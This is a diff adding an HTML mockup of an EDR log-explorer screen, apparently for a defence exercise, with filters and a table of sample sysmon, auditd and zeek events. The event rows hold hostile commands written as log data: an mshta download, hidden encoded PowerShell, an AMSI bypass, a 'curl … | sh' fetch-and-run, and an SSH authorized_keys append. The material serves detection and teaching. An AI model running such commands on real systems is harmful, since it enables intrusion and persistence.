@@ -1,0 +1,370 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <script src="./support.js"></script>
+</head>
+<body>
+<x-dc>
+<helmet>
+  <style>
+    :root{
+      --bg:#1C2127; --panel:#252A31; --raised:#2F343C; --well:#111418;
+      --line:#383E47; --fg:#F6F7F9; --fg2:#ABB3BF; --fg3:#8F99A8; --fg4:#738091;
+      --blue:#2D72D2; --blue4:#4C90F0; --blue5:#8ABBFF; --green5:#72CA9B; --violet:#BDADFF;
+      --crit:#CD4246; --high:#EC9A3C; --med:#FBD065; --low:#3FA6DA;
+      --ui:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;
+      --mono:"SFMono-Regular","Cascadia Mono",Consolas,"Liberation Mono",monospace;
+    }
+    *{box-sizing:border-box}
+    body{margin:0;background:var(--bg);color:var(--fg);font:400 13px/1.3 var(--ui);-webkit-font-smoothing:antialiased}
+    a{color:var(--blue5);text-decoration:none}
+    a:hover{color:#AECBFA;text-decoration:underline}
+    .mono{font-family:var(--mono);font-variant-numeric:tabular-nums}
+    .lbl{font-size:10px;font-weight:600;letter-spacing:.09em;text-transform:uppercase;color:var(--fg4)}
+    .panel{background:var(--panel);border:1px solid var(--line);border-radius:2px}
+    .ph{height:30px;display:flex;align-items:center;gap:8px;padding:0 10px;border-bottom:1px solid var(--line);flex:none}
+    .btn{height:24px;display:inline-flex;align-items:center;gap:6px;padding:0 10px;border-radius:2px;background:#383E47;color:var(--fg);border:none;font:500 12px var(--ui);white-space:nowrap}
+    .btn-primary{background:var(--blue);color:#fff}
+    .btn-min{background:transparent;color:var(--fg2)}
+    .sel{height:24px;display:inline-flex;align-items:center;gap:8px;padding:0 8px;border-radius:2px;background:#383E47;color:var(--fg);font:400 12px var(--ui);box-shadow:inset 0 0 0 1px rgba(255,255,255,.06)}
+    .tag{display:inline-flex;align-items:center;height:16px;padding:0 5px;border-radius:2px;font:600 10px/1 var(--mono);letter-spacing:.02em}
+    .dot{width:7px;height:7px;border-radius:1px;flex:none}
+    .cb{width:12px;height:12px;border-radius:2px;flex:none;box-shadow:inset 0 0 0 1px #738091;background:transparent}
+    .cb-on{background:#2D72D2;box-shadow:none;display:flex;align-items:center;justify-content:center}
+    .th{font:600 10px var(--ui);letter-spacing:.08em;text-transform:uppercase;color:#738091;padding:0 8px;text-align:left}
+    .td{padding:0 8px;font-size:11.5px;color:#C5CBD3;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+    .row{height:26px;display:flex;align-items:center;border-bottom:1px solid rgba(255,255,255,.045)}
+  </style>
+</helmet>
+
+<div style="width:1600px;height:1000px;display:flex;flex-direction:column;background:#1C2127;overflow:hidden">
+
+  <!-- NAVBAR -->
+  <div style="height:50px;flex:none;display:flex;align-items:center;padding:0 14px;background:#252A31;border-bottom:1px solid #111418;box-shadow:0 1px 1px rgba(17,20,24,.4)">
+    <div style="display:flex;align-items:center;gap:9px;padding-right:16px">
+      <svg width="20" height="20" viewBox="0 0 20 20" fill="none" aria-hidden="true">
+        <path d="M10 1.5 17.5 5.5v6.2c0 3.1-3 5.7-7.5 6.8-4.5-1.1-7.5-3.7-7.5-6.8V5.5L10 1.5Z" stroke="#4C90F0" stroke-width="1.4" fill="rgba(45,114,210,.16)"></path>
+        <path d="M6.6 9.9 9.1 12.4 13.6 7.6" stroke="#8ABBFF" stroke-width="1.6" stroke-linecap="square"></path>
+      </svg>
+      <div style="font:600 14px var(--ui);letter-spacing:.02em;color:#F6F7F9">CCDC<span style="color:#5F6B7C">·</span>EDR</div>
+    </div>
+    <div style="width:1px;height:22px;background:#383E47"></div>
+    <div style="display:flex;align-items:stretch;height:50px;margin-left:6px">
+      <div style="display:flex;align-items:center;padding:0 15px;font:400 12.5px var(--ui);color:#ABB3BF">Dashboard</div>
+      <div style="display:flex;align-items:center;padding:0 15px;font:600 12.5px var(--ui);color:#FFFFFF;box-shadow:inset 0 -2px 0 #4C90F0">Log Explorer</div>
+      <div style="display:flex;align-items:center;gap:6px;padding:0 15px;font:400 12.5px var(--ui);color:#ABB3BF">Alerts <span class="tag" style="background:rgba(205,66,70,.18);color:#FA999C">79</span></div>
+      <div style="display:flex;align-items:center;padding:0 15px;font:400 12.5px var(--ui);color:#ABB3BF">Signatures</div>
+      <div style="display:flex;align-items:center;padding:0 15px;font:400 12.5px var(--ui);color:#ABB3BF">Threat Intel</div>
+    </div>
+    <div style="flex-grow:1"></div>
+    <div style="display:flex;align-items:center;gap:10px">
+      <div class="mono" style="font-size:11px;color:#738091">41/47 rules</div>
+      <div style="width:1px;height:18px;background:#383E47"></div>
+      <div class="mono" style="font-size:11px;color:#8F99A8">2026-03-14 14:02:07Z</div>
+      <div class="sel" style="height:26px">
+        <svg width="11" height="11" viewBox="0 0 12 12" fill="none"><circle cx="6" cy="6" r="4.4" stroke="#8F99A8" stroke-width="1.3"></circle><path d="M6 3.6V6l1.8 1.2" stroke="#8F99A8" stroke-width="1.3"></path></svg>
+        Last 6 hours
+        <svg width="9" height="9" viewBox="0 0 10 10" fill="none"><path d="M2 3.8 5 6.8 8 3.8" stroke="#ABB3BF" stroke-width="1.4"></path></svg>
+      </div>
+    </div>
+  </div>
+
+  <!-- QUERY BAR -->
+  <div style="height:44px;flex:none;display:flex;align-items:center;gap:10px;padding:0 14px;background:#1C2127;border-bottom:1px solid #383E47">
+    <div style="flex-grow:1;height:28px;display:flex;align-items:center;gap:8px;padding:0 9px;background:#111418;border-radius:2px;box-shadow:inset 0 0 0 1px #404854, inset 0 0 0 2px rgba(45,114,210,.35)">
+      <svg width="13" height="13" viewBox="0 0 14 14" fill="none"><circle cx="6" cy="6" r="4.2" stroke="#8F99A8" stroke-width="1.4"></circle><path d="M9.2 9.2 12 12" stroke="#8F99A8" stroke-width="1.4" stroke-linecap="square"></path></svg>
+      <span class="mono" style="font-size:12px;color:#F6F7F9">process.cmdline:*-enc* <span style="color:#5F6B7C">AND</span> host:WIN-WKS14</span>
+      <span style="width:1px;height:14px;background:#8ABBFF;margin-left:1px"></span>
+      <div style="flex-grow:1"></div>
+      <span class="mono" style="font-size:10.5px;color:#5F6B7C">⏎ run</span>
+    </div>
+    <div class="sel" style="height:28px">Saved: Encoded PowerShell
+      <svg width="9" height="9" viewBox="0 0 10 10" fill="none"><path d="M2 3.8 5 6.8 8 3.8" stroke="#ABB3BF" stroke-width="1.4"></path></svg>
+    </div>
+    <button class="btn" style="height:28px">
+      <svg width="12" height="12" viewBox="0 0 12 12" fill="none"><path d="M1.5 2.5h9M1.5 6h9M1.5 9.5h5" stroke="#ABB3BF" stroke-width="1.3" stroke-linecap="square"></path></svg>
+      Columns
+    </button>
+    <button class="btn" style="height:28px">Export</button>
+    <div class="mono" style="font-size:11px;color:#738091;white-space:nowrap">1,284 of 24,318 · 38 ms</div>
+  </div>
+
+  <!-- BODY -->
+  <div style="flex-grow:1;display:flex;min-height:0">
+
+    <!-- FACET RAIL -->
+    <div style="width:252px;flex:none;background:#252A31;border-right:1px solid #383E47;display:flex;flex-direction:column;min-height:0">
+      <div class="ph" style="border-bottom:1px solid #383E47">
+        <span class="lbl" style="color:#ABB3BF">Filters</span>
+        <div style="flex-grow:1"></div>
+        <a href="#" style="font-size:10.5px">Clear 2</a>
+      </div>
+
+      <div style="padding:10px 12px;display:flex;flex-direction:column;gap:5px;border-bottom:1px solid rgba(255,255,255,.05)">
+        <div class="lbl">Active</div>
+        <div style="display:flex;flex-wrap:wrap;gap:5px">
+          <span class="tag" style="height:19px;background:rgba(45,114,210,.2);color:#8ABBFF;gap:5px;padding:0 4px 0 6px">host: WIN-WKS14
+            <svg width="8" height="8" viewBox="0 0 8 8" fill="none"><path d="M1.4 1.4 6.6 6.6M6.6 1.4 1.4 6.6" stroke="#8ABBFF" stroke-width="1.3"></path></svg>
+          </span>
+          <span class="tag" style="height:19px;background:rgba(45,114,210,.2);color:#8ABBFF;gap:5px;padding:0 4px 0 6px">source: sysmon
+            <svg width="8" height="8" viewBox="0 0 8 8" fill="none"><path d="M1.4 1.4 6.6 6.6M6.6 1.4 1.4 6.6" stroke="#8ABBFF" stroke-width="1.3"></path></svg>
+          </span>
+        </div>
+      </div>
+
+      <!-- facet: host -->
+      <div style="padding:9px 12px;border-bottom:1px solid rgba(255,255,255,.05);display:flex;flex-direction:column;gap:6px">
+        <div style="display:flex;align-items:center;gap:6px">
+          <svg width="9" height="9" viewBox="0 0 10 10" fill="none"><path d="M2 3.8 5 6.8 8 3.8" stroke="#738091" stroke-width="1.4"></path></svg>
+          <span class="lbl" style="color:#ABB3BF">Host</span>
+          <div style="flex-grow:1"></div><span class="mono" style="font-size:10px;color:#5F6B7C">7</span>
+        </div>
+        <div style="display:flex;flex-direction:column;gap:4px">
+          <div style="position:relative;display:flex;align-items:center;gap:7px;height:17px">
+            <div style="position:absolute;left:19px;top:0;bottom:0;width:190px;background:rgba(76,144,240,.10);border-radius:1px"></div>
+            <span class="cb cb-on"><svg width="8" height="8" viewBox="0 0 8 8" fill="none"><path d="M1.4 4.2 3.2 6 6.6 2.2" stroke="#fff" stroke-width="1.5" stroke-linecap="square"></path></svg></span>
+            <span class="mono" style="font-size:11px;color:#F6F7F9;position:relative">WIN-WKS14</span>
+            <div style="flex-grow:1"></div><span class="mono" style="font-size:10.5px;color:#8F99A8;position:relative">6,204</span>
+          </div>
+          <div style="position:relative;display:flex;align-items:center;gap:7px;height:17px">
+            <div style="position:absolute;left:19px;top:0;bottom:0;width:142px;background:rgba(255,255,255,.045);border-radius:1px"></div>
+            <span class="cb"></span>
+            <span class="mono" style="font-size:11px;color:#ABB3BF;position:relative">WIN-SRV02</span>
+            <div style="flex-grow:1"></div><span class="mono" style="font-size:10.5px;color:#738091;position:relative">4,633</span>
+          </div>
+          <div style="position:relative;display:flex;align-items:center;gap:7px;height:17px">
+            <div style="position:absolute;left:19px;top:0;bottom:0;width:120px;background:rgba(255,255,255,.045);border-radius:1px"></div>
+            <span class="cb"></span>
+            <span class="mono" style="font-size:11px;color:#ABB3BF;position:relative">WIN-DC01</span>
+            <div style="flex-grow:1"></div><span class="mono" style="font-size:10.5px;color:#738091;position:relative">3,918</span>
+          </div>
+          <div style="position:relative;display:flex;align-items:center;gap:7px;height:17px">
+            <div style="position:absolute;left:19px;top:0;bottom:0;width:96px;background:rgba(255,255,255,.045);border-radius:1px"></div>
+            <span class="cb"></span>
+            <span class="mono" style="font-size:11px;color:#ABB3BF;position:relative">LNX-WEB01</span>
+            <div style="flex-grow:1"></div><span class="mono" style="font-size:10.5px;color:#738091;position:relative">3,110</span>
+          </div>
+          <div style="position:relative;display:flex;align-items:center;gap:7px;height:17px">
+            <div style="position:absolute;left:19px;top:0;bottom:0;width:62px;background:rgba(255,255,255,.045);border-radius:1px"></div>
+            <span class="cb"></span>
+            <span class="mono" style="font-size:11px;color:#ABB3BF;position:relative">LNX-JUMP01</span>
+            <div style="flex-grow:1"></div><span class="mono" style="font-size:10.5px;color:#738091;position:relative">2,012</span>
+          </div>
+          <a href="#" style="font-size:10.5px;padding-left:19px">+ 2 more</a>
+        </div>
+      </div>
+
+      <!-- facet: os / source -->
+      <div style="padding:9px 12px;border-bottom:1px solid rgba(255,255,255,.05);display:flex;flex-direction:column;gap:6px">
+        <div style="display:flex;align-items:center;gap:6px">
+          <svg width="9" height="9" viewBox="0 0 10 10" fill="none"><path d="M2 3.8 5 6.8 8 3.8" stroke="#738091" stroke-width="1.4"></path></svg>
+          <span class="lbl" style="color:#ABB3BF">Source</span>
+          <div style="flex-grow:1"></div><span class="mono" style="font-size:10px;color:#5F6B7C">7</span>
+        </div>
+        <div style="display:flex;flex-direction:column;gap:4px">
+          <div style="position:relative;display:flex;align-items:center;gap:7px;height:17px">
+            <div style="position:absolute;left:19px;top:0;bottom:0;width:190px;background:rgba(76,144,240,.10);border-radius:1px"></div>
+            <span class="cb cb-on"><svg width="8" height="8" viewBox="0 0 8 8" fill="none"><path d="M1.4 4.2 3.2 6 6.6 2.2" stroke="#fff" stroke-width="1.5" stroke-linecap="square"></path></svg></span>
+            <span class="mono" style="font-size:11px;color:#F6F7F9;position:relative">sysmon</span>
+            <div style="flex-grow:1"></div><span class="mono" style="font-size:10.5px;color:#8F99A8;position:relative">14,220</span>
+          </div>
+          <div style="position:relative;display:flex;align-items:center;gap:7px;height:17px">
+            <div style="position:absolute;left:19px;top:0;bottom:0;width:76px;background:rgba(255,255,255,.045);border-radius:1px"></div>
+            <span class="cb"></span><span class="mono" style="font-size:11px;color:#ABB3BF;position:relative">winsec</span>
+            <div style="flex-grow:1"></div><span class="mono" style="font-size:10.5px;color:#738091;position:relative">4,682</span>
+          </div>
+          <div style="position:relative;display:flex;align-items:center;gap:7px;height:17px">
+            <div style="position:absolute;left:19px;top:0;bottom:0;width:52px;background:rgba(255,255,255,.045);border-radius:1px"></div>
+            <span class="cb"></span><span class="mono" style="font-size:11px;color:#ABB3BF;position:relative">auditd</span>
+            <div style="flex-grow:1"></div><span class="mono" style="font-size:10.5px;color:#738091;position:relative">3,110</span>
+          </div>
+          <div style="position:relative;display:flex;align-items:center;gap:7px;height:17px">
+            <div style="position:absolute;left:19px;top:0;bottom:0;width:26px;background:rgba(255,255,255,.045);border-radius:1px"></div>
+            <span class="cb"></span><span class="mono" style="font-size:11px;color:#ABB3BF;position:relative">syslog</span>
+            <div style="flex-grow:1"></div><span class="mono" style="font-size:10.5px;color:#738091;position:relative">1,406</span>
+          </div>
+          <div style="position:relative;display:flex;align-items:center;gap:7px;height:17px">
+            <div style="position:absolute;left:19px;top:0;bottom:0;width:18px;background:rgba(255,255,255,.045);border-radius:1px"></div>
+            <span class="cb"></span><span class="mono" style="font-size:11px;color:#ABB3BF;position:relative">zeek</span>
+            <div style="flex-grow:1"></div><span class="mono" style="font-size:10.5px;color:#738091;position:relative">890</span>
+          </div>
+          <div style="position:relative;display:flex;align-items:center;gap:7px;height:17px">
+            <div style="position:absolute;left:19px;top:0;bottom:0;width:16px;background:rgba(255,255,255,.045);border-radius:1px"></div>
+            <span class="cb"></span><span class="mono" style="font-size:11px;color:#ABB3BF;position:relative">powershell</span>
+            <div style="flex-grow:1"></div><span class="mono" style="font-size:10.5px;color:#738091;position:relative">812</span>
+          </div>
+          <div style="position:relative;display:flex;align-items:center;gap:7px;height:17px">
+            <div style="position:absolute;left:19px;top:0;bottom:0;width:8px;background:rgba(255,255,255,.045);border-radius:1px"></div>
+            <span class="cb"></span><span class="mono" style="font-size:11px;color:#ABB3BF;position:relative">suricata</span>
+            <div style="flex-grow:1"></div><span class="mono" style="font-size:10.5px;color:#738091;position:relative">198</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- facet: event id -->
+      <div style="padding:9px 12px;border-bottom:1px solid rgba(255,255,255,.05);display:flex;flex-direction:column;gap:6px">
+        <div style="display:flex;align-items:center;gap:6px">
+          <svg width="9" height="9" viewBox="0 0 10 10" fill="none"><path d="M2 3.8 5 6.8 8 3.8" stroke="#738091" stroke-width="1.4"></path></svg>
+          <span class="lbl" style="color:#ABB3BF">Event ID</span>
+          <div style="flex-grow:1"></div><span class="mono" style="font-size:10px;color:#5F6B7C">18</span>
+        </div>
+        <div style="display:flex;flex-wrap:wrap;gap:4px">
+          <span class="tag" style="background:#2F343C;color:#C5CBD3">1 · 4,910</span>
+          <span class="tag" style="background:#2F343C;color:#C5CBD3">3 · 3,201</span>
+          <span class="tag" style="background:#2F343C;color:#C5CBD3">11 · 1,884</span>
+          <span class="tag" style="background:#2F343C;color:#C5CBD3">13 · 1,402</span>
+          <span class="tag" style="background:#2F343C;color:#C5CBD3">7 · 1,120</span>
+          <span class="tag" style="background:#2F343C;color:#C5CBD3">10 · 706</span>
+          <span class="tag" style="background:#2F343C;color:#C5CBD3">22 · 512</span>
+          <span class="tag" style="background:#2F343C;color:#C5CBD3">8 · 214</span>
+          <span class="tag" style="background:#2F343C;color:#C5CBD3">25 · 61</span>
+          <span class="tag" style="background:transparent;color:#738091;box-shadow:inset 0 0 0 1px #404854">+9</span>
+        </div>
+      </div>
+
+      <!-- facet: category -->
+      <div style="padding:9px 12px;display:flex;flex-direction:column;gap:6px">
+        <div style="display:flex;align-items:center;gap:6px">
+          <svg width="9" height="9" viewBox="0 0 10 10" fill="none"><path d="M2 3.8 5 6.8 8 3.8" stroke="#738091" stroke-width="1.4"></path></svg>
+          <span class="lbl" style="color:#ABB3BF">Category</span>
+          <div style="flex-grow:1"></div><span class="mono" style="font-size:10px;color:#5F6B7C">10</span>
+        </div>
+        <div style="display:flex;flex-wrap:wrap;gap:4px">
+          <span class="tag" style="background:#2F343C;color:#C5CBD3">process</span>
+          <span class="tag" style="background:#2F343C;color:#C5CBD3">network</span>
+          <span class="tag" style="background:#2F343C;color:#C5CBD3">registry</span>
+          <span class="tag" style="background:#2F343C;color:#C5CBD3">file</span>
+          <span class="tag" style="background:#2F343C;color:#C5CBD3">module</span>
+          <span class="tag" style="background:#2F343C;color:#C5CBD3">auth</span>
+          <span class="tag" style="background:#2F343C;color:#C5CBD3">pipe</span>
+          <span class="tag" style="background:#2F343C;color:#C5CBD3">dns</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- TABLE -->
+    <div style="flex-grow:1;display:flex;flex-direction:column;min-width:0;background:#1C2127">
+      <div style="height:24px;flex:none;display:flex;align-items:center;background:#252A31;border-bottom:1px solid #383E47">
+        <div style="width:22px;flex:none"></div>
+        <div class="th" style="width:112px;flex:none">Time</div>
+        <div class="th" style="width:106px;flex:none">Host</div>
+        <div class="th" style="width:78px;flex:none">Source</div>
+        <div class="th" style="width:46px;flex:none">EID</div>
+        <div class="th" style="width:80px;flex:none">Category</div>
+        <div class="th" style="width:104px;flex:none">User</div>
+        <div class="th" style="flex-grow:1;display:flex;align-items:center;gap:5px">Summary
+          <svg width="8" height="8" viewBox="0 0 10 10" fill="none"><path d="M2 3.8 5 6.8 8 3.8" stroke="#5F6B7C" stroke-width="1.4"></path></svg>
+        </div>
+      </div>
+
+      <div style="flex-grow:1;display:flex;flex-direction:column;overflow:hidden">
+
+        <div class="row"><div style="width:22px;flex:none;display:flex;justify-content:center"></div><div class="td mono" style="width:112px;flex:none;color:#8F99A8">13:14:22.109</div><div class="td mono" style="width:106px;flex:none">WIN-WKS14</div><div class="td mono" style="width:78px;flex:none;color:#8F99A8">sysmon</div><div class="td mono" style="width:46px;flex:none">1</div><div class="td" style="width:80px;flex:none;color:#8F99A8">process</div><div class="td mono" style="width:104px;flex:none;color:#8F99A8">CORP\jdoe</div><div class="td mono" style="flex-grow:1">WINWORD.EXE → mshta.exe http://185.117.88.42/u.hta</div></div>
+
+        <div class="row" style="background:rgba(205,66,70,.07)"><div style="width:22px;flex:none;display:flex;justify-content:center"><span class="dot" style="background:#EC9A3C"></span></div><div class="td mono" style="width:112px;flex:none;color:#8F99A8">13:14:22.884</div><div class="td mono" style="width:106px;flex:none">WIN-WKS14</div><div class="td mono" style="width:78px;flex:none;color:#8F99A8">sysmon</div><div class="td mono" style="width:46px;flex:none">1</div><div class="td" style="width:80px;flex:none;color:#8F99A8">process</div><div class="td mono" style="width:104px;flex:none;color:#8F99A8">CORP\jdoe</div><div class="td mono" style="flex-grow:1">mshta.exe → powershell.exe -nop -w hidden -enc SQBFAFgA…</div></div>
+
+        <!-- SELECTED ROW -->
+        <div class="row" style="background:rgba(45,114,210,.20);box-shadow:inset 2px 0 0 #4C90F0;border-bottom:1px solid rgba(76,144,240,.35)"><div style="width:22px;flex:none;display:flex;justify-content:center"><span class="dot" style="background:#CD4246"></span></div><div class="td mono" style="width:112px;flex:none;color:#C5CBD3">13:14:41.402</div><div class="td mono" style="width:106px;flex:none;color:#FFFFFF">WIN-WKS14</div><div class="td mono" style="width:78px;flex:none;color:#C5CBD3">powershell</div><div class="td mono" style="width:46px;flex:none;color:#FFFFFF">4104</div><div class="td" style="width:80px;flex:none;color:#C5CBD3">process</div><div class="td mono" style="width:104px;flex:none;color:#C5CBD3">CORP\jdoe</div><div class="td mono" style="flex-grow:1;color:#FFFFFF">ScriptBlock: [Ref].Assembly.GetType('…AmsiUtils') patch</div></div>
+
+        <div class="row"><div style="width:22px;flex:none"></div><div class="td mono" style="width:112px;flex:none;color:#8F99A8">13:14:41.410</div><div class="td mono" style="width:106px;flex:none">WIN-WKS14</div><div class="td mono" style="width:78px;flex:none;color:#8F99A8">sysmon</div><div class="td mono" style="width:46px;flex:none">7</div><div class="td" style="width:80px;flex:none;color:#8F99A8">module</div><div class="td mono" style="width:104px;flex:none;color:#8F99A8">CORP\jdoe</div><div class="td mono" style="flex-grow:1">ImageLoad C:\Windows\System32\amsi.dll (signed, MS)</div></div>
+
+        <div class="row" style="background:rgba(205,66,70,.07)"><div style="width:22px;flex:none;display:flex;justify-content:center"><span class="dot" style="background:#EC9A3C"></span></div><div class="td mono" style="width:112px;flex:none;color:#8F99A8">13:15:03.771</div><div class="td mono" style="width:106px;flex:none">WIN-WKS14</div><div class="td mono" style="width:78px;flex:none;color:#8F99A8">sysmon</div><div class="td mono" style="width:46px;flex:none">7</div><div class="td" style="width:80px;flex:none;color:#8F99A8">module</div><div class="td mono" style="width:104px;flex:none;color:#8F99A8">CORP\jdoe</div><div class="td mono" style="flex-grow:1">ImageLoad ntdll.dll — second, non-KnownDlls mapping</div></div>
+
+        <div class="row" style="background:rgba(205,66,70,.07)"><div style="width:22px;flex:none;display:flex;justify-content:center"><span class="dot" style="background:#CD4246"></span></div><div class="td mono" style="width:112px;flex:none;color:#8F99A8">13:15:19.033</div><div class="td mono" style="width:106px;flex:none">WIN-WKS14</div><div class="td mono" style="width:78px;flex:none;color:#8F99A8">sysmon</div><div class="td mono" style="width:46px;flex:none">8</div><div class="td" style="width:80px;flex:none;color:#8F99A8">process</div><div class="td mono" style="width:104px;flex:none;color:#8F99A8">CORP\jdoe</div><div class="td mono" style="flex-grow:1">CreateRemoteThread powershell.exe → explorer.exe (4812)</div></div>
+
+        <div class="row"><div style="width:22px;flex:none;display:flex;justify-content:center"><span class="dot" style="background:#FBD065"></span></div><div class="td mono" style="width:112px;flex:none;color:#8F99A8">13:15:19.041</div><div class="td mono" style="width:106px;flex:none">WIN-WKS14</div><div class="td mono" style="width:78px;flex:none;color:#8F99A8">sysmon</div><div class="td mono" style="width:46px;flex:none">10</div><div class="td" style="width:80px;flex:none;color:#8F99A8">process</div><div class="td mono" style="width:104px;flex:none;color:#8F99A8">CORP\jdoe</div><div class="td mono" style="flex-grow:1">ProcessAccess explorer.exe GrantedAccess 0x1F3FFF</div></div>
+
+        <div class="row"><div style="width:22px;flex:none"></div><div class="td mono" style="width:112px;flex:none;color:#8F99A8">13:15:44.918</div><div class="td mono" style="width:106px;flex:none">WIN-SRV02</div><div class="td mono" style="width:78px;flex:none;color:#8F99A8">winsec</div><div class="td mono" style="width:46px;flex:none">4624</div><div class="td" style="width:80px;flex:none;color:#8F99A8">auth</div><div class="td mono" style="width:104px;flex:none;color:#8F99A8">CORP\svc_bk</div><div class="td mono" style="flex-grow:1">Logon type 3 from 10.20.4.61 — scheduled backup</div></div>
+
+        <div class="row"><div style="width:22px;flex:none;display:flex;justify-content:center"><span class="dot" style="background:#FBD065"></span></div><div class="td mono" style="width:112px;flex:none;color:#8F99A8">13:16:02.550</div><div class="td mono" style="width:106px;flex:none">WIN-WKS14</div><div class="td mono" style="width:78px;flex:none;color:#8F99A8">sysmon</div><div class="td mono" style="width:46px;flex:none">13</div><div class="td" style="width:80px;flex:none;color:#8F99A8">registry</div><div class="td mono" style="width:104px;flex:none;color:#8F99A8">CORP\jdoe</div><div class="td mono" style="flex-grow:1">SetValue HKCU\…\Run\OneDriveSync = %APPDATA%\ods.exe</div></div>
+
+        <div class="row"><div style="width:22px;flex:none"></div><div class="td mono" style="width:112px;flex:none;color:#8F99A8">13:16:03.002</div><div class="td mono" style="width:106px;flex:none">WIN-WKS14</div><div class="td mono" style="width:78px;flex:none;color:#8F99A8">sysmon</div><div class="td mono" style="width:46px;flex:none">11</div><div class="td" style="width:80px;flex:none;color:#8F99A8">file</div><div class="td mono" style="width:104px;flex:none;color:#8F99A8">CORP\jdoe</div><div class="td mono" style="flex-grow:1">FileCreate C:\Users\jdoe\AppData\Roaming\ods.exe</div></div>
+
+        <div class="row"><div style="width:22px;flex:none"></div><div class="td mono" style="width:112px;flex:none;color:#8F99A8">13:17:44.100</div><div class="td mono" style="width:106px;flex:none">WIN-WKS14</div><div class="td mono" style="width:78px;flex:none;color:#8F99A8">sysmon</div><div class="td mono" style="width:46px;flex:none">3</div><div class="td" style="width:80px;flex:none;color:#8F99A8">network</div><div class="td mono" style="width:104px;flex:none;color:#8F99A8">CORP\jdoe</div><div class="td mono" style="flex-grow:1">explorer.exe → 185.117.88.42:443 tcp (out, 1,204 B)</div></div>
+
+        <div class="row" style="background:rgba(205,66,70,.07)"><div style="width:22px;flex:none;display:flex;justify-content:center"><span class="dot" style="background:#EC9A3C"></span></div><div class="td mono" style="width:112px;flex:none;color:#8F99A8">13:18:44.106</div><div class="td mono" style="width:106px;flex:none">WIN-WKS14</div><div class="td mono" style="width:78px;flex:none;color:#8F99A8">zeek</div><div class="td mono" style="width:46px;flex:none">conn</div><div class="td" style="width:80px;flex:none;color:#8F99A8">network</div><div class="td mono" style="width:104px;flex:none;color:#5F6B7C">—</div><div class="td mono" style="flex-grow:1">185.117.88.42:443 · 41 conns · Δ 60.0 s ±3.4 s · ja3 a0e9f5b8…</div></div>
+
+        <div class="row"><div style="width:22px;flex:none"></div><div class="td mono" style="width:112px;flex:none;color:#8F99A8">13:19:12.660</div><div class="td mono" style="width:106px;flex:none">LNX-WEB01</div><div class="td mono" style="width:78px;flex:none;color:#8F99A8">auditd</div><div class="td mono" style="width:46px;flex:none">1300</div><div class="td" style="width:80px;flex:none;color:#8F99A8">process</div><div class="td mono" style="width:104px;flex:none;color:#8F99A8">www-data</div><div class="td mono" style="flex-grow:1">execve /bin/bash -c "curl -s 10.20.4.99/i | sh"</div></div>
+
+        <div class="row"><div style="width:22px;flex:none;display:flex;justify-content:center"><span class="dot" style="background:#EC9A3C"></span></div><div class="td mono" style="width:112px;flex:none;color:#8F99A8">13:19:20.114</div><div class="td mono" style="width:106px;flex:none">LNX-WEB01</div><div class="td mono" style="width:78px;flex:none;color:#8F99A8">auditd</div><div class="td mono" style="width:46px;flex:none">1302</div><div class="td" style="width:80px;flex:none;color:#8F99A8">file</div><div class="td mono" style="width:104px;flex:none;color:#8F99A8">www-data</div><div class="td mono" style="flex-grow:1">openat /home/deploy/.ssh/authorized_keys O_WRONLY|O_APPEND</div></div>
+
+        <div class="row"><div style="width:22px;flex:none"></div><div class="td mono" style="width:112px;flex:none;color:#8F99A8">13:20:01.000</div><div class="td mono" style="width:106px;flex:none">LNX-DB02</div><div class="td mono" style="width:78px;flex:none;color:#8F99A8">syslog</div><div class="td mono" style="width:46px;flex:none">cron</div><div class="td" style="width:80px;flex:none;color:#8F99A8">process</div><div class="td mono" style="width:104px;flex:none;color:#8F99A8">root</div><div class="td mono" style="flex-grow:1">CRON session opened for user root (pam_unix)</div></div>
+
+        <div class="row"><div style="width:22px;flex:none"></div><div class="td mono" style="width:112px;flex:none;color:#8F99A8">13:20:14.318</div><div class="td mono" style="width:106px;flex:none">WIN-DC01</div><div class="td mono" style="width:78px;flex:none;color:#8F99A8">winsec</div><div class="td mono" style="width:46px;flex:none">4688</div><div class="td" style="width:80px;flex:none;color:#8F99A8">process</div><div class="td mono" style="width:104px;flex:none;color:#8F99A8">CORP\admin</div><div class="td mono" style="flex-grow:1">C:\Windows\System32\dsquery.exe group "Domain Admins"</div></div>
+
+        <div class="row"><div style="width:22px;flex:none"></div><div class="td mono" style="width:112px;flex:none;color:#8F99A8">13:21:07.552</div><div class="td mono" style="width:106px;flex:none">WIN-WKS07</div><div class="td mono" style="width:78px;flex:none;color:#8F99A8">sysmon</div><div class="td mono" style="width:46px;flex:none">22</div><div class="td" style="width:80px;flex:none;color:#8F99A8">dns</div><div class="td mono" style="width:104px;flex:none;color:#8F99A8">CORP\asmith</div><div class="td mono" style="flex-grow:1">QueryName: updates.contoso.com → 10.20.4.30</div></div>
+
+        <div style="flex-grow:1"></div>
+      </div>
+
+      <div style="height:26px;flex:none;display:flex;align-items:center;gap:12px;padding:0 12px;background:#111418;border-top:1px solid #383E47">
+        <span class="mono" style="font-size:10.5px;color:#5F6B7C">rows 1–17 of 1,284</span>
+        <span class="mono" style="font-size:10.5px;color:#5F6B7C">virtualized · 26 px rows</span>
+        <div style="flex-grow:1"></div>
+        <span class="mono" style="font-size:10.5px;color:#5F6B7C">sorted: time desc</span>
+      </div>
+    </div>
+
+    <!-- DETAIL DRAWER -->
+    <div style="width:436px;flex:none;background:#252A31;border-left:1px solid #383E47;display:flex;flex-direction:column;min-height:0">
+      <div style="height:34px;flex:none;display:flex;align-items:center;gap:8px;padding:0 12px;border-bottom:1px solid #383E47">
+        <span class="dot" style="background:#CD4246"></span>
+        <span style="font:600 12.5px var(--ui);color:#F6F7F9">Event detail</span>
+        <div style="flex-grow:1"></div>
+        <span class="mono" style="font-size:10.5px;color:#5F6B7C">evt_0a41c7</span>
+        <svg width="11" height="11" viewBox="0 0 12 12" fill="none"><path d="M2 2 10 10M10 2 2 10" stroke="#8F99A8" stroke-width="1.4"></path></svg>
+      </div>
+
+      <div style="height:28px;flex:none;display:flex;align-items:stretch;padding:0 12px;border-bottom:1px solid #383E47">
+        <div style="display:flex;align-items:center;padding:0 10px;font:600 11.5px var(--ui);color:#FFFFFF;box-shadow:inset 0 -2px 0 #4C90F0">Normalized</div>
